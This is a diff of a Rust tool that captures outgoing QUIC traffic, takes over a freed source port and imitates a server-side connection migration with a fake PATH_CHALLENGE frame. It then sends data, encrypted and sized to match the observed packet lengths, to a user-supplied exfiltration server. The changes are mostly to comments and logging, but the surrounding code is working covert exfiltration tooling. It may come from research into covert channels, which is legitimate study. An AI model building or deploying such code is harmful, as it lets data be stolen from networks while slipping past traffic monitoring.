@@ -51,8 +51,8 @@ const DIRECTION: pcap::Direction = pcap::Direction::Out;
 
 #[derive(Debug, Clone, PartialEq)]
 struct P {
-    header: pcap::PacketHeader, // Here, PacketHeader contains the length of the entire packet + the timestamp
-    data: Vec<u8>, // Data includes the actual packet bytes (including its protocol headers)
+    header: pcap::PacketHeader, // here, PacketHeader contains the length of the entire packet + the timestamp
+    data: Vec<u8>, // data includes the actual packet bytes (including its protocol headers)
 }
 
 fn compute_payload_checksum(payload: &Vec<u8>) -> String {
@@ -107,9 +107,7 @@ fn start_packet_capture(tx: &mpsc::Sender<Result<P, mpsc::RecvError>>, cli: Cli)
             data: (packet_data),
         };
 
-        // send packet to handle2 thread
         tx.send(Ok(p)).unwrap();
-        dbg!("Packet sent to handle2 thread");
     }
 }
 
@@ -147,7 +145,7 @@ fn main() {
 
     let handle2: thread::JoinHandle<_> = thread::spawn(move || {
         loop {
-            dbg!("Check if your VPN is on...");
+            // dbg!("Check if your VPN is on...");
 
             // dummy init
             let mut data = P {
@@ -174,7 +172,7 @@ fn main() {
             // extract timestamp from header
             let packet_timestamp: f64 =
                 (data.header.ts.tv_sec as f64) + ((data.header.ts.tv_usec as f64) / 1000000.0);
-            println!("Packet timestamp: {:?}", packet_timestamp);
+            //dbg!("Packet timestamp: {:?}", packet_timestamp);
 
             // dummy init
             let mut packet = PacketHeaders {
@@ -247,18 +245,15 @@ fn main() {
                 }
             }
 
-            /*println!("Packet lengths dataset size: {:?}", packet_lengths.len());
-            if packet_lengths.len() < cli.buffer {
-                continue;
-            }*/
             let packet_count: usize = packet_lengths_per_dcid.values().map(|v| v.len()).sum();
-            println!("Packet lengths dataset size: {:?}", packet_count);
+            println!("Packets dataset size: {:?}", packet_count);
             if packet_count < cli.buffer {
                 continue;
             }
 
             let payload_checksum: String = compute_payload_checksum(&quic_packet.as_bytes());
-            // IPv6     ->    //let dest: String = format!("[{}]:{}", cli.dst, cli.port); // could be enhanced by providing an array of exfiltration server IPs and rotating between them
+            
+            // IPv6     ->    //let dest: String = format!("[{}]:{}", cli.dst, cli.port);
             // IPv4:
             let dest: String = format!("{}:{}", cli.dst, cli.port); // could be enhanced by providing an array of exfiltration server IPs and rotating between them
             let udp_srcport: u16 = packet.transport.unwrap().udp().unwrap().source_port;
@@ -272,17 +267,13 @@ fn main() {
                 let timedeltas_per_dcid: HashMap<String, Vec<f64>> =
                     compute_timedeltas_per_dcid(&timestamps_per_dcid);
 
-                /*for (id, deltas) in &timedeltas_per_dcid {
-                    println!("{}: {:?}", id, deltas);
-                }*/
-
                 // Keep looping until "successfully bound to address and port" -> connection hijacked -> start proper exfiltration on this source port.
                 match UdpSocket::bind(local_addr) {
                     Ok(socket) => {
-                        // here the legitimate QUIC connection has released its source port SOCKET binding
-                        // we can now simulate a server-side connection migration by changing the destination IP address
+                        // here the legitimate QUIC connection has released its source port socket binding
+                        // we can now simulate a server-side connection migration by changing the destination IP address and sending a QUIC packet seamingly containing a PATH_CHALLENGE frame
                         // then we can start exfiltrating data via this connection for x number of packets / or x amount of time and subsequently discard the connection and continue via a new one
-                        println!("Successfully bound to address and port");
+                        println!("Successfully bound to address and port.");
 
                         let mut payloads: Vec<Vec<u8>> = Vec::new();
                         let mut pos: u64 = 0;
@@ -291,7 +282,6 @@ fn main() {
                         // prepare the encrypted exfiltration payloads
                         while i < cli.number.try_into().unwrap() {
                             // randomly sample from previously observed packet lengths
-                            //let sample: &u16 = get_random_packetlength_sample(&mut packet_lengths);
                             let default: Vec<u16> = Vec::from([28]);
                             let sample: &u16 = get_random_packetlength_sample(
                                 &packet_lengths_per_dcid
@@ -312,7 +302,7 @@ fn main() {
 
                         // starting new thread handle to exfiltrate data, while remaining to listen for new socket connections on thread handle2
                         let _ = thread::spawn(move || {
-                            dbg!("Exfiltrating data...");
+                            dbg!("Exfiltrating data ...");
 
                             // the first packet bool indicates whether a fake PATH_CHALLENGE frame should be sent or not
                             let mut first: bool = true;
@@ -323,7 +313,7 @@ fn main() {
                                 // send packet that mimics a path validation (PATH_CHALLENGE) frame
                                 // PATH_CHALLENGE frame should be at least 1200 bytes
                                 if first {
-                                    dbg!("Sending PATH_CHALLENGE...");
+                                    println!("Sending PATH_CHALLENGE...");
                                     let mut rng: ThreadRng = rng();
                                     let path_challenge_frame_length: usize =
                                         1350 - quic_packet.dcid_len as usize - 1; // set to simulate length of Cloudflare Quiche Connection Migration Packets
@@ -334,7 +324,7 @@ fn main() {
                                     quic_packet.remaining_payload = random_path_challenge_frame;
                                     first = false;
                                 } else {
-                                    dbg!("Exfiltrating using a normal protected payload packet...");
+                                    println!("Exfiltrating using a normal protected payload packet...");
                                     quic_packet.remaining_payload = payloads[i - 1].clone();
                                 }
 
